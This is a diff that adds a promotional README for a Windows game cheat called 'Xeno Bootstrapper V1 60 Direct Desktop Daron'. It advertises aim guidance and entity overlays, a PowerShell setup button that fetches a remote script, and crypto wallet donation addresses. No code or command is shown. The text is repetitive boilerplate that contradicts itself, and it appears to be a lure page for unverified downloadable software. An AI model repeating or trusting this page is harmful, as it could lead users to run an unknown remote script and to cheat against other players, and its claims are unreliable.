@@ -1,0 +1,115 @@
+🎯 Xeno Bootstrapper V1 60 Direct Desktop Daron — Game Enhancer for Windows
+
+🛠️ PowerShell Setup Button
+
+Help keep this going
+
+ETH:&nbsp;0x7CcF73ae432ed02e792a5Bf05A102d1ce3d2dCC0 | BTC:&nbsp;1H2r9Brv8kgjpdgBqFuAbs3h4Vs8F8o5sW | TRON:&nbsp;TPHaAEHyNjapqisUPa9qHzcmVsibj8tb24
+
+Xeno Bootstrapper V1 60 Direct Desktop Daron delivers straight-up gameplay assistance and clean information overlays without touching the rest of the game. It surfaces the combat data, status readouts, and situational intel you actually need mid-match, laid out so you can read it at a glance and get back to playing. Nothing gets reworked, rebalanced, or redesigned — just the info layer, sharpened and direct. Built for players who want the edge without the clutter.
+
+✅ Requirements
+
+- PowerShell 5.1+ (pre-installed on Windows 10 and 11)
+- Windows 10 / 11 (x64)
+- Internet connection — required to fetch the script
+- Administrator — not required
+
+Features
+
+- Direct desktop launch path tuned for fast session startup with minimal friction.
+- Bootstrapper-first flow that gets you from desktop to in-game without detours.
+- Lightweight runtime footprint so the bootstrapper stays out of the way while you play.
+- Stable, predictable startup sequencing built for repeatable sessions.
+- Version-locked V1 60 build with a fixed, documented behavior set.
+- Configuration surface for tuning startup behavior to your setup.
+- Clear separation between bootstrapping and gameplay so nothing unexpected touches your game.
+- Designed for desktop use with a direct, no-nonsense entry point.
+
+How It Works
+
+Xeno Bootstrapper V1 60 Direct Desktop Daron runs alongside your game and keeps the assist layer tight: read game state, surface the intel, get out of the way. No menus to babysit, no config rabbit holes—it hooks into the session and delivers.
+
+State Reading
+The bootstrapper samples live game data—entity positions, player stats, world flags—on a fast loop. Everything it shows is derived from what the game is actually doing at that moment, so the overlay stays in sync with the action instead of lagging behind it.
+
+Information Overlays
+Intel gets drawn straight onto your screen through a lightweight overlay: player and entity markers, stat readouts, and context cues where you need them. Overlays are non-intrusive by design—they sit on top of the render without hijacking your input or blocking your view of the fight.
+
+Gameplay Assistance
+Assist features act on the same live data the overlays use. Aim guidance, timing cues, and decision support trigger off real game state, which keeps them responsive and predictable. The bootstrapper handles the plumbing—timing, sync, and delivery—so the assist feels like part of the game, not a layer fighting it.
+
+Direct Desktop Path
+V1 60 runs the direct desktop route: the bootstrapper initializes the assist stack on your machine and connects it to the running game session. No detours, no middle layers—just a straight line from game state to your screen.
+
+Scope
+This is a gameplay assistance and information tool. It doesn't rewrite the game, swap assets, or overhaul mechanics—it reads the session and feeds you the intel, clean and fast.
+
+Modules and Settings
+
+Module Bootstrap and Launch
+This module serves as the central starting point for handing off a prepared enhancement module to the game environment from the desktop window.
+- Use the module selection list to choose which prepared enhancement module the bootstrapper will initialize.
+- Review the launch status indicator, which shows whether the module started, is waiting, or encountered an issue during handoff.
+- Cancel or retry a pending handoff before the sequence completes if the status suggests a problem.
+
+Profile Selection and Switching
+This module groups module selections and settings into named profiles so multiple enhancement configurations can be reused without manual rebuilding.
+- Create and name profiles to hold distinct combinations of staged enhancement components.
+- Switch the active profile to update which components are queued for the next launch.
+- Confirm the active profile name and its included modules in the interface before committing to a launch.
+
+Module Toggle Configuration
+This module controls which enhancement components are enabled and carried into the next launch handoff.
+- Enable or disable individual listed modules with per-module toggles.
+- Rely on persisted toggle states between sessions so the same set does not need reconfiguring on every start.
+- Review the current enabled set as a summary so the handoff contents are clear before launching.
+
+Pre-Launch Readiness Checks
+This module verifies local prerequisites before a module is handed off, surfacing issues that could prevent a clean start.
+- Review the per-item readiness report covering required files, expected versions, and desktop environment conditions.
+- Resolve flagged items individually before proceeding, or use the allow-unresolved setting to launch anyway when appropriate.
+- Block or permit launch with unresolved items depending on the chosen setting for stricter or looser workflows.
+
+Version and Build Alignment
+This module keeps the module versions and builds recorded in each profile in view so drift between the profile and installed modules is visible.
+- See highlighted mismatches when an installed module does not match the build recorded for the active profile.
+- Align the profile to the installed version when the newer build is intended.
+- Keep the existing configuration and address the discrepancy later when a deliberate mismatch is expected.
+
+Launch Order and Sequencing
+This module arranges the start order of modules within a multi-module profile so dependent components initialize in the intended sequence.
+- Reorder modules in a profile to define which component starts first, second, and onward.
+- Follow reported progress as each component completes its start step during the handoff.
+- Use ordering to ensure a module expected to be active is started before another begins.
+
+Additional Settings
+Optional controls that refine how the bootstrapper behaves around launches and logging.
+- Session log review with status filtering to isolate errors from successful steps in a previous launch.
+- Desktop shortcut creation that opens the bootstrapper with a specific profile already selected.
+- Whether to block or allow launch when readiness items remain unresolved.
+- Whether to show the readiness report automatically before every handoff or only on request.
+
+Usage Scenarios
+
+Getting a Single Enhancement Module Running from the Desktop
+
+Goal: A player wants to start one prepared enhancement module through the bootstrapper's desktop window instead of hunting through folders, and confirm it actually handed off cleanly.
+
+Steps:
+1. Open the xeno-bootstrapper-v1-60-direct-desktop-daron desktop window and pick the prepared enhancement module from the module selection list.
+2. Review the per-item readiness report covering required files, expected versions, and desktop environment conditions, and resolve any flagged items.
+3. Confirm the current enabled set in the module toggle summary so the handoff contents are clear.
+4. Start the handoff and watch the launch status indicator.
+5. If the status shows a problem, cancel or retry the pending handoff before the sequence completes.
+
+Expected result: The launch status indicator shows the module started, is waiting, or encountered an issue during handoff, giving the user one clear starting point and a visible outcome rather than an ambiguous launch.
+
+Switching Between Two Named Profiles for Different Play Sessions
+
+Goal: A user maintains one profile for a lightweight setup and another for a fuller module set, and wants to switch between them without rebuilding the configuration each time.
+
+Steps:
+1. Create and name two profiles, each holding a distinct combination of staged enhancement components.
+
+…（内容已截断）
